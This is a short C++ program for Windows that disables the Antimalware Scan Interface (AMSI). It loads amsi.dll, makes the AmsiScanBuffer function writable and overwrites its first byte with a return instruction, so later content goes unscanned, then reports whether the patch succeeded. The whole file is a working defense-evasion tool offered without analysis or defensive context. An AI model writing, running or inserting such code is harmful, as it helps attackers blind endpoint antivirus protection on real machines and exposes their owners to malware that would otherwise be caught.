#include <windows.h>
#include <iostream>

BOOL PatchAMSI()
{
    HMODULE hAMSI = LoadLibraryA("amsi.dll");
    if (hAMSI == NULL)
    {
        std::cerr << "Failed to load amsi.dll" << std::endl;
        return FALSE;
    }

    FARPROC pAmsiScanBuffer = GetProcAddress(hAMSI, "AmsiScanBuffer");
    if (pAmsiScanBuffer == NULL)
    {
        std::cerr << "Failed to get address of AmsiScanBuffer" << std::endl;
        return FALSE;
    }

    DWORD oldProtect;
    if (VirtualProtect(pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect))
    {
        *(BYTE*)pAmsiScanBuffer = 0xC3; // 0xC3 is the opcode for 'ret' in x86 assembly
        VirtualProtect(pAmsiScanBuffer, 1, oldProtect, &oldProtect);
        return TRUE;
    }
    else
    {
        std::cerr << "Failed to change memory protection" << std::endl;
        return FALSE;
    }
}

int main()
{
    if (PatchAMSI())
    {
        std::cout << "AMSI patched successfully." << std::endl;
    }
    else
    {
        std::cout << "Failed to patch AMSI." << std::endl;
    }
    return 0;
}
